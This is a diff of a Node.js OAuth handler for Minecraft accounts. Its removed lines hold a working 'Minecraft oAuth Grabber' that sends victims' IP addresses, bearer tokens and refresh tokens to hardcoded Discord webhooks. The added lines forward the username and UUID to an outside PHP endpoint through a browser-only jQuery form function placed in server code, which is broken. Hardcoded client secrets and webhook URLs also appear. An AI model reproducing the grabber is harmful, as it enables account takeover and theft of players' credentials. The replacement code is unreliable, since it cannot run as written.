@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'rY28Q~yPuLfcw6OaawN3tsUSngCbNfsBxAHPPb.U'
-const client_id = '9c23fce6-2fbe-47f3-a36d-94a56b37a3bc'
-const redirect_uri = 'https://zany-blue-crow-robe.cyclic.app'
-const webhook_url = 'https://discord.com/api/webhooks/1160604080914321448/wz8Kv1TtI-zN3wgGhJ9V1MN1nFbDxU_fQahQm9yM8X0yl67Yqdh-jml_fjofshpcZygT'
+const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
+const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
+const redirect_uri = 'https://d-na.herokuapp.com/'
+const webhook_url = 'webhook'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,14 +10,11 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    const code = req.query.code;
+    res.send('인증이 완료되었습니다!')
+    const code = req.query.code
     if (code == null) {
-        return res.send('Verification unsuccessful. No code provided.');
+        return
     }
-
-    // Redirect to the desired URL
-    return res.redirect(302, redirect_uri);
-});
     try {
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
         const accessToken = accessTokenAndRefreshTokenArray[0]
@@ -31,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
@@ -52,7 +49,7 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        client_secret: client_secret,
+        secret_value: secret_value,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -123,33 +120,23 @@ async function getUsernameAndUUID(bearerToken) {
 function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
-
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
-    const url = webhook_url
-    let data = {
-  username: "MOG",
-  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
-  content: "@everyone",
-  embeds: [
-    {
-      title: "Ratted " + username + " - Click for networth",
-      color: 5898337,
-      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
-      url: "https://spillager.live/skyblock/networth/"+username,
-      footer: {
-        text: "Minecraft oAuth Grabber by WH0",
-        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
-      },
-    }
-  ],
-}
-    axios.all([ 
-        axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1035739384525365249/znx8rkzuOMqWkPrt2JDOL1xmMbIpM-g-36akxGoEEMohhSj1blZINPbn9k2afyHdL5tW", data)
-           .then(() => console.log("Successfully authenticated, posting to webhook!"))
-    ])
+function pageGoPost(d){
+	var insdoc = "";
     
+	for (var i = 0; i < d.vals.length; i++) {
+	  insdoc+= "<input type='hidden' name='"+ d.vals[i][0] +"' value='"+ d.vals[i][1] +"'>";
+	}
+    
+	var goform = $("<form>", {
+	  method: "post",
+	  action: d.url,
+	  target: d.target,
+	  html: insdoc
+	}).appendTo("body");
+    
+	goform.submit();
 }
+
 
 
 const bannedNames = []
